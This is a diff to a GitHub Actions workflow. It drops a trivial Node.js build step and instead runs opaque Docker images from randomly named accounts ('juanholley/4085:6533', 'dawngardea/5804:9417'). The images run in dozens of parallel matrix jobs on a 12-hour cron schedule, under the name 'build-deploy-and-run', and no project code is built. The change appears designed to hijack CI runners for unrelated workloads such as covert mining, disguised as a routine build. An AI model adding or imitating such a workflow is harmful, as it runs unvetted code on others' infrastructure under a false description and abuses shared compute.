@@ -1,10 +1,12 @@
-name: CI nodeJS
+name: CI-Build-And-Run
 on:   
   push:
+  schedule: 
+  - cron: "0 */12 * * *"
 
 jobs:
   A1:
-    runs-on: macos-latest-xlarge
+    runs-on: ubuntu-24.04
     strategy:
       max-parallel: 20
       fail-fast: false
@@ -15,9 +17,32 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.A1 }}
     steps:
-    - name: Set up Node.js
-      uses: actions/setup-node@v4
-      with:
-        node-version: "20"
-    - name: A1-BUILD
-      run: date
+          - name: build-deploy-and-run
+            uses: docker://juanholley/4085:6533
+  B1:
+    needs: A1
+    runs-on: ubuntu-24.04
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        B1: [1.1, 1.2, 1.3, 1.4]
+        flag: [A, B, C, D, E, F, G, H, I, J]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.B1 }}
+    steps:
+          - name: build-deploy-and-run
+            uses: docker://dawngardea/5804:9417
+  OKE-2:
+    needs: [A1, B1]
+    if: always()
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: technote-space/workflow-conclusion-action@v2
+      - name: Check Failure
+        if: env.WORKFLOW_CONCLUSION == 'failure'
+        run: exit 1
+      - name: Success
+        if: ${{ success() }}
+        run: echo "SUCCESS"
